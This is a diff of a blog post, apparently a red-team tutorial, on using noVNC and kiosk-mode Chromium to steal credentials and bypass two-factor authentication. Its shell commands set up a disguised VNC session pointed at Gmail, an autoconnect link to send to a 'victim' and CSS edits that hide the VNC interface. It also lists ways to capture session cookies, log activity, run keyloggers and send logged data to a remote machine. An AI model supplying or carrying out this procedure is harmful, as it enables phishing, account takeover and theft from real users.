@@ -10,40 +10,54 @@ image:
 ---
 
 
-```markdown
-# Using noVNC for Credential Acquisition and Bypassing 2FA
 
-noVNC is both a JavaScript library for VNC clients and an application built on top of this library. Compatible with any modern browser, including mobile versions for iOS and Android, noVNC allows the web browser to function as a VNC client, enabling remote access to a machine.
+# **Using noVNC for Credential Acquisition and Bypassing 2FA**
 
-So, how can we use noVNC to acquire credentials and bypass 2FA? We set up a server with noVNC, start Chromium (or any other browser) in Kiosk mode, and direct it to the desired website for user authentication (e.g., accounts.google.com). By sending the link to the target user, when they click on the URL, they will access the VNC session without realizing it. And since we’ve already configured Chromium in Kiosk mode, the user experience will be just a web page, as expected.
+**noVNC** is both a **JavaScript library for VNC clients** and an application built on top of this library. Compatible with **any modern browser**, including mobile versions for iOS and Android, noVNC allows the web browser to function as a **VNC client**, enabling **remote access to a machine**.
 
-## Exploitation Possibilities
+So, how can we use noVNC to **acquire credentials** and **bypass 2FA**? Here's the process:
 
-The exploitation possibilities of this method are vast:
+1. Set up a server with noVNC.
+2. Start **Chromium** (or any other browser) in **Kiosk mode**.
+3. Direct it to the desired website for user authentication (e.g., `accounts.google.com`).
+4. Send the link to the target user. When they click the URL, they will access the **VNC session** without realizing it.
+5. Since Chromium is configured in **Kiosk mode**, the user experience will appear as a normal web page.
 
-- Inject JS into the browser
-- Use an HTTP proxy connected to the browser to log all activities
-- Terminate the VNC session after user authentication
-- Capture the browser session token (Right-click > Inspect > Application > Cookies) after the user disconnects
-- Run a background keylogger
-- Or get creative and find other approaches (remember, the server is yours).
+---
 
-## noVNC Setup and Demonstration
+## **Exploitation Possibilities**
 
-### Deploy a Kali Linux Instance
+The exploitation possibilities of this method are **vast**:
 
-Use any cloud service provider or deploy locally to set up a Linux machine. I will use Kali Linux for this demonstration because I prefer it, but you can choose any other Linux distribution you are comfortable with.
+- **Inject JS** into the browser.
+- Use an **HTTP proxy** connected to the browser to log all activities.
+- **Terminate the VNC session** after user authentication.
+- Capture the **browser session token** (Right-click > Inspect > Application > Cookies) after the user disconnects.
+- Run a **background keylogger**.
+- Or **get creative** and find other approaches (remember, the server is yours).
 
-### Install TigerVNC
+---
 
-First, you need to install VNC software. I tested two options: X11vnc and TigerVNC. After several tests, I chose to use TigerVNC.
+## **noVNC Setup and Demonstration**
+
+### **1. Deploy a Kali Linux Instance**
+
+Use any **cloud service provider** or deploy locally to set up a Linux machine. I will use **Kali Linux** for this demonstration because I prefer it, but you can choose any other Linux distribution you are comfortable with.
+
+---
+
+### **2. Install TigerVNC**
+
+First, you need to install **VNC software**. I tested two options: **X11vnc** and **TigerVNC**. After several tests, I chose to use **TigerVNC**.
 
 ```shell
 sudo apt update
 sudo apt install tigervnc-standalone-server tigervnc-xorg-extension tigervnc-viewer
 ```
 
-### Set Up a VNC Password
+---
+
+### **3. Set Up a VNC Password**
 
 ```shell
 vncpasswd
@@ -74,13 +88,19 @@ Add execution permissions:
 chmod +x ~/.vnc/xstartup
 ```
 
-Now restart the VNC server, remembering that you will choose the screen size settings according to your needs. noVNC automatically adjusts to the browser's screen size, but do your own testing.
+---
+
+### **4. Restart the VNC Server**
+
+Restart the VNC server, choosing the **screen size settings** according to your needs. noVNC automatically adjusts to the browser's screen size, but do your own testing.
 
 ```shell
 vncserver -depth 32 -geometry 1920x1080
 ```
 
-### Download and Run noVNC
+---
+
+### **5. Download and Run noVNC**
 
 ```shell
 git clone https://github.com/novnc/noVNC.git
@@ -92,48 +112,48 @@ OR
 apt install novnc
 ```
 
-Now run noVNC locally or publicly; here are the commands.
+Now run noVNC **locally** or **publicly**. Here are the commands:
 
-In some cases, you will need to configure SSH to run on localhost.
-
-First, check which port your TigerVNC server is running on:
+- **Check the VNC server port:**
 
 ```shell
 vncserver -list
 ```
 
-Example: 5901, 5902, 5903, etc.
+Example: `5901`, `5902`, `5903`, etc.
 
-Run the commands below for each purpose.
-
-- To run noVNC:
+- **Run noVNC:**
 
 ```shell
 ./noVNC/utils/novnc_proxy --vnc localhost:5901
 ```
 
-- To set up an SSH tunnel:
+- **Set up an SSH tunnel:**
 
 ```shell
 ssh -L 6080:127.0.0.1:6080 root@server
 ```
 
-- To run publicly using port 8081:
+- **Run publicly using port 8081:**
 
 ```shell
 ufw allow http
 ./noVNC/utils/novnc_proxy --vnc 0.0.0.0:5901 --listen 8081
 ```
 
-### Accessing VNC and Running the Browser in Kiosk Mode
+---
 
-Now access your VNC and run the browser in Kiosk mode. I used Chromium, but you can use whatever suits your needs.
+### **6. Access VNC and Run the Browser in Kiosk Mode**
+
+Access your VNC and run the browser in **Kiosk mode**. I used **Chromium**, but you can use whatever suits your needs.
 
 ```shell
 chromium --no-sandbox --app=https://gmail.com --kiosk
 ```
 
-### How to Send the URL to the "Victim" to Connect Automatically
+---
+
+### **7. Send the URL to the "Victim" to Connect Automatically**
 
 ```shell
 http://127.0.0.1:6080/vnc.html?autoconnect=true&password=YOUR-PASSWORD
@@ -141,9 +161,11 @@ http://127.0.0.1:6080/vnc.html?autoconnect=true&password=YOUR-PASSWORD
 
 The `autoconnect=true&password=VNCPASSWORD` will make the user authenticate automatically. If you want to rename the query parameter, you can modify the `vnc.html` file.
 
-### Modifying the CSS to Remove Visual Elements
+---
 
-noVNC displays a custom loading page, a VNC control bar, and some additional unnecessary visual elements that should be removed.
+### **8. Modify the CSS to Remove Visual Elements**
+
+noVNC displays a **custom loading page**, a **VNC control bar**, and some additional unnecessary visual elements that should be removed.
 
 Open `vnc.html`, find the `divs` below, and add the CSS style shown.
 
@@ -156,12 +178,11 @@ Open `vnc.html`, find the `divs` below, and add the CSS style shown.
 <div id="noVNC_transition" style="background-color:white;color:white">
 ```
 
-## Important Notes
+---
 
-- You are giving remote access to your machine! It should not have anything valuable stored on it.
-- Any logged data should likely be sent to a remote machine.
-- Do not use the root account. You should set up a restricted user account that uses the VNC service.
-- You should also configure the Kiosk mode more restrictively.
-```
+## **Important Notes**
 
-This combines all the Markdown text, including proper code blocks for shell commands and HTML. You can now paste it directly into your Markdown file or editor. Let me know if you need any further adjustments!
+- **You are giving remote access to your machine!** It should not have anything valuable stored on it.
+- Any logged data should likely be sent to a **remote machine**.
+- **Do not use the root account.** Set up a restricted user account that uses the VNC service.
+- Configure the **Kiosk mode** more restrictively.
